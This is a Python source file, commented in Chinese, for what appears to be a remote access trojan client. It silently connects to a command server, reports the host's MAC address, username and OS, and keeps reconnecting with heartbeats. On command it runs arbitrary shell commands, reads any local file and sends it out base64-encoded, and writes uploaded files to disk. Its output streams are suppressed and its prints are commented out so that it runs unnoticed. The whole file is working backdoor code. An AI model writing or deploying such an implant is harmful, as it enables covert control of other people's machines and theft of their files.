import socket
import uuid
import json
import threading
import base64
import getpass
import platform
import subprocess
import time
import os
import sys
if sys.stdin is None:
    sys.stdin = open(os.devnull, 'r')
if sys.stdout is None:
    sys.stdout = open(os.devnull, 'w')
if sys.stderr is None:
    sys.stderr = open(os.devnull, 'w')

class Client:
    def __init__(self, server_host='localhost', server_port=9999):
        self.server_host = server_host
        self.server_port = server_port
        self.client_socket = None
        self.mac_address = self.get_mac_address()
        self.username = getpass.getuser()
        self.system_info = platform.system() + " " + platform.release()
        self.running = True
        self.current_directory = os.getcwd()
        self.send_lock = threading.Lock()

    def get_mac_address(self):
        mac = uuid.getnode()
        return ':'.join(['{:02x}'.format((mac >> i) & 0xff)
                         for i in range(0, 12, 2)][::-1])

    def connect_to_server(self):
        try:
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.server_host, self.server_port))

            client_info = {
                'mac': self.mac_address,
                'username': self.username,
                'system': self.system_info
            }
            self.send_message(client_info)  # 发送设备信息到server端）
            #print(f"已连接到服务器 {self.server_host}:{self.server_port}")
            return True
        except Exception as e:
            #print(f"连接服务器失败: {e}")
            return False

    def send_message(self, message):
        try:
            message_str = json.dumps(message, ensure_ascii=False) + "\n"
            with self.send_lock:
                self.client_socket.sendall(message_str.encode("utf-8"))
            return True
        except Exception as e:
            #print(f"发送消息失败: {e}")
            return False

    def heartbeat_loop(self, interval=5):
        while self.running:
            ok = self.send_message({'type': 'heartbeat'})
            if not ok:
                break
            time.sleep(interval)


    # 随时监听服务器命令
    def receive_commands(self):
        buffer = b""
        while self.running:
            try:
                data = self.client_socket.recv(4096)
                if not data:
                    #print("服务器连接已断开")
                    break
                buffer += data

                while b"\n" in buffer:
                    line, buffer = buffer.split(b"\n", 1)
                    if not line.strip():
                        continue

                    try:
                        command = json.loads(line.decode("utf-8"))
                    except json.JSONDecodeError:
                        continue

                    response = self.handle_message(command)
                    if response is not None:
                        self.send_message(response)

            except Exception as e:
                #print(f"接收命令时出错: {e}")
                break

    def handle_message(self, command):
        ctype = command.get('type')
        if ctype == 'ping':
            return {'status': 'success', 'message': 'pong'}
        elif ctype == 'heartbeat':
            return {'status': 'success', 'message': 'heartbeat ack'}
        elif ctype == 'info':
            return {
                'status': 'success',
                'data': {
                    'mac': self.mac_address,
                    'username': self.username,
                    'system': self.system_info,
                    'current_dir': self.current_directory
                }
            }
        elif ctype == 'execute':
            return self.execute_command(command.get('command'))
        elif ctype == 'download':
            return self.download_file(command.get('path'))
        elif ctype == 'upload':
            return self.upload_file(command.get('path'), command.get('data'))
        else:
            return None


    # 命令执行器
    def execute_command(self, cmd):
        try:
            if not cmd:
                return {'status': 'error', 'message': '命令为空'}

            stripped = cmd.strip()
            if stripped.startswith('cd ') or stripped == 'cd':
                return self.handle_cd_command(stripped)

            if stripped == 'pwd':
                return {
                    'status': 'success',
                    'command': cmd,
                    'stdout': self.current_directory + '\n',
                    'stderr': '',
                    'returncode': 0,
                    'current_dir': self.current_directory
                }

            is_windows = (platform.system() == "Windows")
            try:
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    text=True,
                    encoding='gbk' if is_windows else 'utf-8',
                    errors='ignore' if is_windows else None,
                    timeout=30,
                    cwd=self.current_directory
                )


                return {
                    'status': 'success',
                    'command': cmd,
                    'stdout': result.stdout if result.stdout else '',
                    'stderr': result.stderr if result.stderr else '',
                    'returncode': result.returncode,
                    'current_dir': self.current_directory
                }
            except subprocess.TimeoutExpired:
                return {'status': 'error', 'command': cmd, 'message': '命令执行超时'}
            except Exception as e:
                return {'status': 'error', 'command': cmd, 'message': f'执行错误: {str(e)}'}

        except Exception as e:
            return {'status': 'error', 'message': f'命令处理异常: {str(e)}'}

    def handle_cd_command(self, cmd):
        try:
            parts = cmd.split(' ', 1)
            if len(parts) == 1 or parts[1].strip() == '':
                target_dir = os.path.expanduser('~')
            else:
                target_dir = parts[1].strip()

            if not os.path.isabs(target_dir):
                target_dir = os.path.join(self.current_directory, target_dir)

            target_dir = os.path.normpath(target_dir)

            if os.path.exists(target_dir) and os.path.isdir(target_dir):
                self.current_directory = target_dir
                return {
                    'status': 'success',
                    'command': cmd,
                    'stdout': f'切换到目录: {self.current_directory}\n',
                    'stderr': '',
                    'returncode': 0,
                    'current_dir': self.current_directory
                }
            else:
                return {
                    'status': 'error',
                    'command': cmd,
                    'stdout': '',
                    'stderr': f'目录不存在: {target_dir}\n',
                    'returncode': 1,
                    'current_dir': self.current_directory
                }
        except Exception as e:
            return {'status': 'error', 'command': cmd, 'message': f'cd 命令执行错误: {str(e)}'}

    def download_file(self, remote_path):
        try:
            if not remote_path:
                return {'status': 'error', 'message': '远程文件路径不能为空'}
            remote_path = os.path.expanduser(remote_path)
            if not os.path.isabs(remote_path):
                remote_path = os.path.join(self.current_directory, remote_path)
            remote_path = os.path.normpath(remote_path)

            if not os.path.isfile(remote_path):
                return {'status': 'error', 'message': f'文件不存在: {remote_path}'}

            with open(remote_path, 'rb') as f:
                file_bytes = f.read()

            return {
                'status': 'success',
                'message': f'文件读取成功: {remote_path}',
                'path': remote_path,
                'size': len(file_bytes),
                'data': base64.b64encode(file_bytes).decode('utf-8')
            }
        except Exception as e:
            return {'status': 'error', 'message': f'读取文件失败: {e}'}

    def upload_file(self, remote_path, data_b64):
        try:
            if not remote_path:
                return {'status': 'error', 'message': '远程保存路径不能为空'}
            if not data_b64:
                return {'status': 'error', 'message': '上传数据为空'}

            remote_path = os.path.expanduser(remote_path)
            if not os.path.isabs(remote_path):
                remote_path = os.path.join(self.current_directory, remote_path)
            remote_path = os.path.normpath(remote_path)

            file_bytes = base64.b64decode(data_b64.encode('utf-8'))
            parent = os.path.dirname(remote_path)
            if parent:
                os.makedirs(parent, exist_ok=True)

            with open(remote_path, 'wb') as f:
                f.write(file_bytes)

            return {
                'status': 'success',
                'message': f'上传成功: {remote_path}',
                'path': remote_path,
                'size': len(file_bytes)
            }
        except Exception as e:
            return {'status': 'error', 'message': f'写入文件失败: {e}'}

    def start(self):
        while True:
            if self.connect_to_server():
                self.running = True
                recv_thread = threading.Thread(target=self.receive_commands, daemon=True)
                hb_thread = threading.Thread(target=self.heartbeat_loop, daemon=True)
                recv_thread.start()
                hb_thread.start()

                recv_thread.join()

                self.running = False
                try:
                    self.client_socket.close()
                except:
                    pass
                self.client_socket = None

                #print("连接丢失，5秒后尝试重连...")
            time.sleep(5)

    def stop(self):
        self.running = False
        if self.client_socket:
            try:
                self.client_socket.close()
            except:
                pass


if __name__ == "__main__":
    client = Client()
    try:
        client.start()
    except KeyboardInterrupt:
        #print("\n正在关闭客户端...")
        client.stop()
